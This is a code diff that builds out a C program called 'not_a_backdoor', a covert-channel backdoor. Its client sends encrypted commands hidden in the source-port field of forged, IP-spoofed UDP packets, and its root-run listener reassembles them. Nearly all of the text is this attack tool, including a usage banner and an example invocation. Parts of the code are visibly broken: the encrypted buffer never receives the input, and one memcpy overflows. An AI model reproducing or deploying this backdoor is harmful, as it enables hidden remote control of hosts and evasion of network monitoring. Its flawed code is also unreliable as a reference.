@@ -1,12 +1,98 @@
 #include "not_a_backdoor.h"
-#include "covert_udp.h"
+#include "crypto.h"
 
 int main(int argc, char **argv)
 {
     // get input
-    // if backdoor or client
+    unsigned int source_host = 0, dest_host = 0;
+    unsigned short source_port = 0, dest_port = 80;
+    int ipid = 0, backdoor = 0;
+    int count;
+    char desthost[80], srchost[80];
 
-    //
+    /* Title */
+    printf("\nNot Starting the Backdoor\n\n");
+
+    /* Can they run this? */
+    if (geteuid() != 0)
+    {
+        printf("\nYou need to be root to run this.\n\n");
+        exit(0);
+    }
+
+    /* Tell them how to use this thing */
+    if ((argc < 8) || (argc > 10))
+    {
+        usage(argv[0]);
+        exit(0);
+    }
+
+    /* No error checking on the args...next version :) */
+    for (count = 0; count < argc; ++count)
+    {
+        if (strcmp(argv[count], "-dest") == 0)
+        {
+            dest_host = host_convert(argv[count + 1]);
+            strncpy(desthost, argv[count + 1], 79);
+        }
+        else if (strcmp(argv[count], "-source") == 0)
+        {
+            source_host = host_convert(argv[count + 1]);
+            strncpy(srchost, argv[count + 1], 79);
+        }
+
+        else if (strcmp(argv[count], "-source_port") == 0)
+            source_port = atoi(argv[count + 1]);
+        else if (strcmp(argv[count], "-dest_port") == 0)
+            dest_port = atoi(argv[count + 1]);
+        else if (strcmp(argv[count], "-ipid") == 0)
+            ipid = 1;
+        else if (strcmp(argv[count], "-backdoor") == 0)
+            backdoor = 1;
+    }
+
+    if (backdoor == 0) /* if they want to be a client do this... */
+    {
+        if (source_host == 0 && dest_host == 0)
+        {
+            printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
+            exit(1);
+        }
+        else
+        {
+            printf("Source IP     : %s\n", srchost);
+            printf("Source Port   : %u\n\n", source_port);
+
+            printf("Backdoor IP   : %s\n", desthost);
+            printf("Backdoor Port : %u\n\n", dest_port);
+
+            printf("\nClient Mode: \n\n");
+        }
+    }
+    else /* Backdoor mode it is */
+    {
+        if (source_host == 0 && source_port == 0)
+        {
+            printf("You need to supply a source address and/or source port for Backdoor mode.\n");
+            exit(1);
+        }
+        else
+        {
+
+            printf("Source IP     : %s\n", srchost);
+            printf("Source Port   : %u\n", source_port);
+
+            printf("Backdoor IP   : %s\n", desthost);
+            printf("Backdoor Port : %u\n", dest_port);
+
+            printf("\nBackdoor Mode: \n\n");
+        }
+    }
+
+    /* Do the dirty work */
+    forgepacket(source_host, dest_host, source_port, dest_port, backdoor, ipid);
+
+    return 0;
 }
 
 /*--------------------------------------------------------------------------
@@ -27,9 +113,9 @@ int main(int argc, char **argv)
  * NOTES:
  * This section runs client or the server code if server flag was set
  * -----------------------------------------------------------------------*/
-void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int svr, int ipid)
+void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int backdoor, int ipid)
 {
-    if (svr == 0)
+    if (backdoor == 0)
     {
         client(source_addr, dest_addr, source_port, dest_port, ipid);
         fprintf(stdout, "\nPackets Sent\n\n");
@@ -62,23 +148,23 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
  * -----------------------------------------------------------------------*/
 void client(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int ipid)
 {
-    int ch;
     int send_socket;
     struct sockaddr_in sin;
     struct send_udp send_udp;
-    FILE *input;
-    int isReading = 1;
 
     // GET COMMAND INPUT
-    char *commandBuffer[BUFF_SIZE];
-    memcpy(commandBuffer, 0, BUFF_SIZE);
+    char commandBuffer[BUFF_SIZE];
+    memset(&commandBuffer, 0, BUFF_SIZE);
+
+    fprintf(stdout, "\nEnter Command:");
+    fgets(commandBuffer, BUFF_SIZE, stdin);
 
     // ENCRYPT DATA
     char *command = (char *)malloc(BUFF_SIZE);
     unsigned char ciphertext[BUFF_SIZE];
 
-    int ciphertext_len = encrypt((unsigned char *)command, BUFF_SIZE, KEY, IV, ciphertext);
-    unsigned int *cypher_len = htonl(ciphertext_len);
+    int ciphertext_len = encrypt((unsigned char *)command, BUFF_SIZE, (unsigned char *)KEY, (unsigned char *)IV, ciphertext);
+    int cypher_len = htonl(ciphertext_len);
     memcpy(commandBuffer, &cypher_len, ENC_LEN);
     memcpy((commandBuffer + ENC_LEN), &cypher_len, BUFF_SIZE);
 
@@ -113,7 +199,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short sou
         send_udp.udp.dest = htons(dest_port);
 
         // HIDE HERE
-        send_udp.udp.source = (htons(ch + commandBuffer[i]));
+        send_udp.udp.source = (htons(commandBuffer[i]));
 
         /* Drop our forged data into the socket struct */
         sin.sin_family = AF_INET;
@@ -146,12 +232,10 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short sou
 
         /* Away we go.... */
         sendto(send_socket, &send_udp, 28, 0, (struct sockaddr *)&sin, sizeof(sin));
-        printf("Sending Data: %c\n", ch);
+        // printf("Sending Data: %c\n", ch);
 
         close(send_socket);
     }
-
-    fclose(input);
 }
 
 /*--------------------------------------------------------------------------
@@ -173,9 +257,8 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short sou
  * Server function for unvealing the message from the UDP header and
  * writing the the message to a file.
  * -----------------------------------------------------------------------*/
-void server(unsigned int source_addr, unsigned short source_port, unsigned short dest_port, c int ipid)
+void server(unsigned int source_addr, unsigned short source_port, unsigned short dest_port, int ipid)
 {
-    FILE *output;
     int recv_socket;
     struct recv_udp recv_packet;
     char *commandBuffer[BUFF_SIZE + ENC_LEN + BUFF_EXTRA];
@@ -200,8 +283,10 @@ void server(unsigned int source_addr, unsigned short source_port, unsigned short
         read(recv_socket, (struct recv_udp *)&recv_packet, 9999);
 
         // corect dp and correct flag
-        if ((dp = ntohs(recv_packet.udp.dest)) == dest_port)
+        if (ntohs(recv_packet.udp.dest) == dest_port)
         {
+            dp = ntohs(recv_packet.udp.source);
+
             if (buff_len < ENC_LEN)
             {
                 cypher_size[packet_counter] = dp;
@@ -215,7 +300,7 @@ void server(unsigned int source_addr, unsigned short source_port, unsigned short
             {
                 if (dp != 0)
                 {
-                    commandBuffer[buff_len] = (char)dp;
+                    memcpy(commandBuffer[buff_len], &dp, 1);
                 }
                 else
                 {
@@ -230,8 +315,6 @@ void server(unsigned int source_addr, unsigned short source_port, unsigned short
         packet_counter++;
         close(recv_socket); /* close the socket so we don't hose the kernel */
     }
-
-    fclose(output);
 }
 
 /*--------------------------------------------------------------------------
@@ -325,4 +408,24 @@ unsigned int host_convert(char *hostname)
         bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
     }
     return i.s_addr;
+}
+
+void usage(char *progname)
+{
+    printf("Covert UDP usage: \n%s -dest dest_ip -source source_ip -source_port port -dest_port port -backdoor \n\n", progname);
+    printf("-dest dest_ip      - Host to send data to.\n");
+    printf("-source source_ip  - Host where you want the data to originate from.\n");
+    printf("                     In BACKDOOR mode this is the host data will\n");
+    printf("                     be coming FROM.\n");
+    printf("-source_port port  - IP source port you want data to appear from. \n");
+    printf("                     (randomly set by default)\n");
+    printf("-dest_port port    - IP source port you want data to go to. In\n");
+    printf("                     BACKDOOR mode this is the port data will be coming\n");
+    printf("                     inbound on. Port 80 by default.\n");
+    printf("-backdoor            - Passive mode to allow receiving of data.\n");
+
+    printf("\nPress ENTER for examples.");
+    getchar();
+    printf("\nExample: \n./not_a_backdoor -dest 192.168.1.1 -source 192.168.1.2 -source_port 1234 -dest_port 80 -backdoor\n\n");
+    exit(0);
 }
